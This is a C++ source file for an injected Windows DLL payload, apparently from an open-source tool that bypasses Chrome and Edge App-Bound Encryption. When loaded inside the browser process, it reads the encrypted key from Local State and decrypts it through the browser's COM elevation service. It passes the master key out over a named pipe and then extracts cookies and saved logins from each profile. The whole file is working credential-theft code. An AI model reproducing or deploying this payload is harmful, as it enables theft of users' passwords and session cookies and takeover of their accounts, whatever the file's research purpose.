// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "../core/common.hpp"
#include "../sys/bootstrap.hpp"
#include "pipe_client.hpp"
#include "browser_config.hpp"
#include "data_extractor.hpp"
#include "fingerprint.hpp"
#include "../com/elevator.hpp"
#include <fstream>
#include <sstream>

using namespace Payload;

struct ThreadParams {
    HMODULE hModule;
    LPVOID lpPipeName;
};

std::vector<uint8_t> GetEncryptedKey(const std::filesystem::path& localState) {
    std::ifstream f(localState, std::ios::binary);
    if (!f) throw std::runtime_error("Cannot open Local State");
    
    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
    
    std::string tag = "\"app_bound_encrypted_key\":\"";
    size_t pos = content.find(tag);
    if (pos == std::string::npos) throw std::runtime_error("Key not found");
    
    pos += tag.length();
    size_t end = content.find('"', pos);
    if (end == std::string::npos) throw std::runtime_error("Malformed JSON");
    
    std::string b64 = content.substr(pos, end - pos);
    
    DWORD size = 0;
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr);
    std::vector<uint8_t> data(size);
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, data.data(), &size, nullptr, nullptr);
    
    if (data.size() < 4) throw std::runtime_error("Invalid key data");
    return std::vector<uint8_t>(data.begin() + 4, data.end());
}

DWORD WINAPI PayloadThread(LPVOID lpParam) {
    auto params = std::unique_ptr<ThreadParams>(static_cast<ThreadParams*>(lpParam));
    LPCWSTR pipeName = static_cast<LPCWSTR>(params->lpPipeName);

    try {
        PipeClient pipe(pipeName);
        if (!pipe.IsValid()) return 1;

        auto config = pipe.ReadConfig();
        auto browser = DetectBrowser();

        pipe.LogDebug("Running in " + browser.name);

        std::vector<uint8_t> masterKey;
        {
            Com::Elevator elevator;
            auto encKey = GetEncryptedKey(browser.userDataPath / "Local State");
            masterKey = elevator.DecryptKey(encKey, browser.clsid, browser.iid, browser.name == "Edge");
        }
        
        // Send key as structured message
        std::string keyHex;
        for (auto b : masterKey) {
            char buf[3];
            sprintf_s(buf, "%02X", b);
            keyHex += buf;
        }
        pipe.Log("KEY:" + keyHex);

        DataExtractor extractor(pipe, masterKey, config.outputPath);
        
        for (const auto& entry : std::filesystem::directory_iterator(browser.userDataPath)) {
            try {
                if (entry.is_directory()) {
                    if (std::filesystem::exists(entry.path() / "Network" / "Cookies") ||
                        std::filesystem::exists(entry.path() / "Login Data")) {
                        extractor.ProcessProfile(entry.path(), browser.name);
                    }
                }
            } catch (...) {
                // Continue to next profile if one fails
            }
        }

        if (config.fingerprint) {
            FingerprintExtractor fingerprinter(pipe, browser, config.outputPath);
            fingerprinter.Extract();
        }

    } catch (const std::exception& e) {
        PipeClient pipe(pipeName);
        pipe.Log("[-] " + std::string(e.what()));
    }

    FreeLibraryAndExitThread(params->hModule, 0);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        auto params = new ThreadParams{hModule, lpReserved};
        HANDLE hThread = CreateThread(NULL, 0, PayloadThread, params, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
